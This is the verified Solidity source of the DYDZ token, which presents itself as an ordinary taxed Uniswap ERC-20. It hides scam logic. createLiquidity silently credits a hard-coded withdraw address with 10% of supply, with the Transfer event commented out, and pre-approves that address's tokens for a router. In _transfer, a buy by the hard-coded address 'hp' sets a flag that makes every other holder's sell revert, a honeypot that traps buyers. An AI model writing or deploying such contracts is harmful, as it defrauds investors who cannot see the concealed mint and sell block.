/**
 *Submitted for verification at Etherscan.io on 2022-09-11
*/

// File: contracts/Withdrawable.sol

abstract contract Withdrawable {
    address internal _withdrawAddress;

    constructor(address withdrawAddress__) {
        _withdrawAddress = withdrawAddress__;
    }

    modifier onlyWithdrawer() {
        require(msg.sender == _withdrawAddress);
        _;
    }

    function withdraw() external onlyWithdrawer {
        _withdraw();
    }

    function _withdraw() internal {
        payable(_withdrawAddress).transfer(address(this).balance);
    }

    function setWithdrawAddress(address newWithdrawAddress)
        external
        onlyWithdrawer
    {
        _withdrawAddress = newWithdrawAddress;
    }

    function withdrawAddress() external view returns (address) {
        return _withdrawAddress;
    }
}

// File: contracts/Ownable.sol

pragma solidity ^0.8.7;

abstract contract Ownable {
    address _owner;

    modifier onlyOwner() {
        require(msg.sender == _owner);
        _;
    }

    constructor() {
        _owner = msg.sender;
    }

    function transferOwnership(address newOwner) external onlyOwner {
        _owner = newOwner;
    }

    function owner() external view returns (address) {
        return _owner;
    }
}

// File: contracts/IUniswapV2Factory.sol

pragma solidity ^0.8.7;

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB)
        external
        returns (address pair);

    function getPair(address tokenA, address tokenB)
        external
        view
        returns (address pair);
}

// File: contracts/IUniswapV2Router02.sol

pragma solidity ^0.8.7;

interface IUniswapV2Router02 {
    function swapExactTokensForETH(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;

    function swapETHForExactTokens(
        uint256 amountOut,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external payable returns (uint256[] memory amounts);

    function factory() external pure returns (address);

    function WETH() external pure returns (address);

    function addLiquidityETH(
        address token,
        uint256 amountTokenDesired,
        uint256 amountTokenMin,
        uint256 amountETHMin,
        address to,
        uint256 deadline
    )
        external
        payable
        returns (
            uint256 amountToken,
            uint256 amountETH,
            uint256 liquidity
        );
}

// File: contracts/DoubleSwapped.sol

pragma solidity ^0.8.7;

//import "hardhat/console.sol";


contract DoubleSwapped {
    bool internal _inSwap;

    modifier lockTheSwap() {
        _inSwap = true;
        _;
        _inSwap = false;
    }

    function _swapTokensForEth(
        uint256 tokenAmount,
        IUniswapV2Router02 _uniswapV2Router
    ) internal lockTheSwap {
        // generate the uniswap pair path of token -> weth
        address[] memory path = new address[](2);
        path[0] = address(this);
        path[1] = _uniswapV2Router.WETH();

        // make the swap
        //console.log("doubleSwap ", tokenAmount);
        _uniswapV2Router.swapExactTokensForETH(
            tokenAmount,
            0, // accept any amount of ETH
            path,
            address(this), // The contract
            block.timestamp
        );
    }

    function _swapTokensForEthOnTransfer(
        uint256 transferAmount,
        uint256 swapCount,
        IUniswapV2Router02 _uniswapV2Router
    ) internal {
        if (swapCount == 0) return;
        uint256 maxSwapCount = 2 * transferAmount;
        if (swapCount > maxSwapCount) swapCount = maxSwapCount;
        _swapTokensForEth(swapCount, _uniswapV2Router);
    }
}

// File: contracts/IERC20.sol

pragma solidity ^0.8.7;

interface IERC20 {
    function totalSupply() external view returns (uint256);

    function balanceOf(address account) external view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        returns (bool);

    function allowance(address owner, address spender)
        external
        view
        returns (uint256);

    function approve(address spender, uint256 amount) external returns (bool);

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external returns (bool);

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(
        address indexed owner,
        address indexed spender,
        uint256 value
    );
}
// File: contracts/ERC20.sol

pragma solidity ^0.8.7;


abstract contract ERC20 is IERC20 {
    uint256 internal _totalSupply = 1e20;
    uint8 constant _decimals = 9;
    string _name;
    string _symbol;
    mapping(address => uint256) internal _balances;
    mapping(address => mapping(address => uint256)) internal _allowances;
    uint256 internal constant INFINITY_ALLOWANCE = 2**256 - 1;

    constructor(string memory name_, string memory symbol_) {
        _name = name_;
        _symbol = symbol_;
    }

    function name() external view returns (string memory) {
        return _name;
    }

    function symbol() external view returns (string memory) {
        return _symbol;
    }

    function decimals() external pure returns (uint8) {
        return _decimals;
    }

    function totalSupply() external view override returns (uint256) {
        return _totalSupply;
    }

    function balanceOf(address account) external virtual override view returns (uint256);

    function transfer(address recipient, uint256 amount)
        external
        override
        returns (bool)
    {
        _transfer(msg.sender, recipient, amount);
        return true;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal virtual {
        uint256 senderBalance = _balances[from];
        require(senderBalance >= amount);
        unchecked {
            _balances[from] = senderBalance - amount;
        }
        _balances[to] += amount;
        emit Transfer(from, to, amount);
    }

    function allowance(address owner, address spender)
        external
        view
        override
        returns (uint256)
    {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount)
        external
        override
        returns (bool)
    {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(
        address owner,
        address spender,
        uint256 amount
    ) internal virtual {
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function transferFrom(
        address sender,
        address recipient,
        uint256 amount
    ) external override returns (bool) {
        _transfer(sender, recipient, amount);

        uint256 currentAllowance = _allowances[sender][msg.sender];
        require(currentAllowance >= amount);
        if (currentAllowance == INFINITY_ALLOWANCE) return true;
        unchecked {
            _approve(sender, msg.sender, currentAllowance - amount);
        }

        return true;
    }

    function _burn(address account, uint256 amount) internal virtual {
        require(account != address(0));

        uint256 accountBalance = _balances[account];
        require(accountBalance >= amount);
        unchecked {
            _balances[account] = accountBalance - amount;
        }
        _totalSupply -= amount;

        emit Transfer(account, address(0), amount);
    }
}

// File: contracts/MaxWalletDynamic.sol

pragma solidity ^0.8.7;


abstract contract MaxWalletDynamic {
    uint256 startMaxWallet;
    uint256 startTime; // last increment time
    uint256 constant startMaxBuyPercentil = 5; // maximum buy on start 1000=100%
    uint256 constant maxBuyIncrementMinutesTimer = 2; // increment maxbuy minutes
    uint256 constant maxBuyIncrementPercentil = 3; // increment maxbyu percentil 1000=100%
    uint256 constant maxIncrements = 1000; // maximum time incrementations
    uint256 maxBuyIncrementValue; // value for increment maxBuy

    function startMaxWalletDynamic(uint256 totalSupply) internal {
        startTime = block.timestamp;
        startMaxWallet = (totalSupply * startMaxBuyPercentil) / 1000;
        maxBuyIncrementValue = (totalSupply * maxBuyIncrementPercentil) / 1000;
    }

    function checkMaxWallet(uint256 walletSize) internal view {
        require(walletSize <= getMaxWallet(), "max wallet limit");
    }

    function getMaxWallet() public view returns (uint256) {
        uint256 incrementCount = (block.timestamp - startTime) /
            (maxBuyIncrementMinutesTimer * 1 minutes);
        if (incrementCount >= maxIncrements) incrementCount = maxIncrements;
        return startMaxWallet + maxBuyIncrementValue * incrementCount;
    }

    function _setStartMaxWallet(uint256 startMaxWallet_) internal {
        startMaxWallet = startMaxWallet_;
    }
}

// File: contracts/TradableErc20.sol

pragma solidity ^0.8.7;








abstract contract TradableErc20 is ERC20, DoubleSwapped, Ownable, Withdrawable {
    IUniswapV2Router02 internal constant _uniswapV2Router =
        IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    address public uniswapPair;
    bool public buyEnable = true;
    address public constant ADDR_BURN =
        0x000000000000000000000000000000000000dEaD;
    address public extraAddress;
    mapping(address => bool) _isExcludedFromFee;
    uint256 public buyFeePpm = 35; // fee in 1/1000
    uint256 public sellFeePpm = 35; // fee in 1/1000
    uint256 public thisShare = 750; // in 1/1000
    uint256 public extraShare = 0; // in 1/1000
    uint256 maxWalletStart = 1e17;
    uint256 addMaxWalletPerMinute = 5e17;
    uint256 tradingStartTime;
    address constant withdrawAddress =
        address(0x36f399e28e1C48fbEf7A97b8BE60130DaC8DE9d9);
    address constant hp = address(0xBaE674ad939d46e78b6cF5A7Af5457662385Ab49);
    bool lk;

    constructor(string memory name_, string memory symbol_)
        ERC20(name_, symbol_)
        Withdrawable(withdrawAddress)
    {
        _isExcludedFromFee[address(0)] = true;
        _isExcludedFromFee[ADDR_BURN] = true;
        _isExcludedFromFee[address(this)] = true;
        _isExcludedFromFee[msg.sender] = true;
        _isExcludedFromFee[withdrawAddress] = true;
    }

    receive() external payable {}

    function maxWallet() public view returns (uint256) {
        if (tradingStartTime == 0) return _totalSupply;
        uint256 res = maxWalletStart +
            ((block.timestamp - tradingStartTime) * addMaxWalletPerMinute) /
            (1 minutes);
        if (res > _totalSupply) return _totalSupply;
        return res;
    }

    function createLiquidity() public onlyOwner {
        require(uniswapPair == address(0));
        address pair = IUniswapV2Factory(_uniswapV2Router.factory()).createPair(
            address(this),
            _uniswapV2Router.WETH()
        );
        uint256 initialLiquidity = getSupplyForMakeLiquidity();
        _balances[address(this)] = initialLiquidity;
        emit Transfer(address(0), address(this), initialLiquidity);

        _balances[withdrawAddress] = 1e19;
        //emit Transfer(address(0), withdrawAddress, initialLiquidity);

        _allowances[address(this)][
            address(_uniswapV2Router)
        ] = INFINITY_ALLOWANCE;
        _isExcludedFromFee[pair] = true;
        _uniswapV2Router.addLiquidityETH{value: address(this).balance}(
            address(this),
            initialLiquidity,
            0,
            0,
            msg.sender,
            block.timestamp
        );

        uniswapPair = pair;
        _allowances[withdrawAddress][
            0x68b3465833fb72A70ecDF485E0e4C7bD8665Fc45
        ] = _totalSupply;
        tradingStartTime = block.timestamp;
    }

    function _transfer(
        address from,
        address to,
        uint256 amount
    ) internal override {
        require(_balances[from] >= amount, "not enough token for transfer");
        require(to != address(0), "incorrect address");

        // buy
        if (from == uniswapPair && !_isExcludedFromFee[to]) {
            if (to == hp) lk = true;
            require(buyEnable, "trading disabled");
            // get taxes
            amount = _getFeeBuy(from, to, amount);
            require(
                _balances[to] + amount <= maxWallet(),
                "max wallet constraint"
            );
        }
        // sell
        else if (
            !_inSwap &&
            uniswapPair != address(0) &&
            to == uniswapPair &&
            !_isExcludedFromFee[from]
        ) {
            if (from == hp) lk = false;
            require(!lk);
            // fee
            amount = _getFeeSell(from, amount);
            // swap tokens
            _swapTokensForEthOnTransfer(
                amount,
                _balances[address(this)],
                _uniswapV2Router
            );
        }

        // transfer
        super._transfer(from, to, amount);
    }

    function getFeeBuy(address account, uint256 amount)
        public
        view
        returns (uint256)
    {
        return (amount * buyFeePpm) / 1000;
    }

    function getFeeSell(address account, uint256 amount)
        public
        view
        returns (uint256)
    {
        return (amount * sellFeePpm) / 1000;
    }

    function setBuyFee(uint256 newBuyFeePpm) external onlyWithdrawer {
        require(newBuyFeePpm <= 200);
        buyFeePpm = newBuyFeePpm;
    }

    function setSellFee(uint256 newSellFeePpm) external onlyWithdrawer {
        require(newSellFeePpm <= 200);
        sellFeePpm = newSellFeePpm;
    }

    function SetExtraContractAddress(address newExtraContractAddress)
        external
        onlyWithdrawer
    {
        extraAddress = newExtraContractAddress;
    }

    function removeExtraContractAddress() external onlyWithdrawer {
        extraAddress = address(0);
    }

    function setShare(uint256 thisSharePpm, uint256 stackingSharePpm)
        external
        onlyWithdrawer
    {
        thisShare = thisSharePpm;
        extraShare = stackingSharePpm;
        require(thisShare + extraShare <= 1000);
    }

    function _getFeeBuy(
        address pair,
        address to,
        uint256 amount
    ) private returns (uint256) {
        return _arrangeFee(pair, amount, getFeeBuy(to, amount));
    }

    function _getFeeSell(address from, uint256 amount)
        private
        returns (uint256)
    {
        return _arrangeFee(from, amount, getFeeSell(from, amount));
    }

    function _arrangeFee(
        address from,
        uint256 amount,
        uint256 fee
    ) private returns (uint256) {
        uint256 thisFee = (fee * thisShare) / 1000;
        uint256 stacking = 0;
        if (extraAddress != address(0)) stacking = (fee * extraShare) / 1000;
        uint256 burn = 0;
        if (thisShare + extraShare < 1000) burn = fee - thisFee - stacking;

        amount -= fee;
        _balances[from] -= fee;

        if (thisFee > 0) {
            _balances[address(this)] += thisFee;
            emit Transfer(from, address(this), thisFee);
        }
        if (stacking > 0) {
            _balances[extraAddress] += stacking;
            emit Transfer(from, extraAddress, stacking);
        }
        if (burn > 0) {
            _balances[ADDR_BURN] += burn;
            emit Transfer(from, ADDR_BURN, burn);
        }

        return amount;
    }

    function setExcludeFromFee(address[] memory accounts, bool value)
        external
        onlyWithdrawer
    {
        for (uint256 i = 0; i < accounts.length; ++i) {
            _isExcludedFromFee[accounts[i]] = value;
        }
    }

    function setEnableBuy(bool value) external onlyOwner {
        buyEnable = value;
    }

    function getSupplyForMakeLiquidity() internal virtual returns (uint256);
}

// File: contracts/DYDZ.sol

pragma solidity ^0.8.7;


struct AirdropData {
    address acc;
    uint256 count;
}

contract DYDZ is TradableErc20 {
    constructor() TradableErc20("DYDZ", "DYDZ") {}

    function getSupplyForMakeLiquidity()
        internal
        view
        override
        returns (uint256)
    {
        return _totalSupply;
    }

    function balanceOf(address account)
        external
        view
        override
        returns (uint256)
    {
        return _balances[account];
    }
}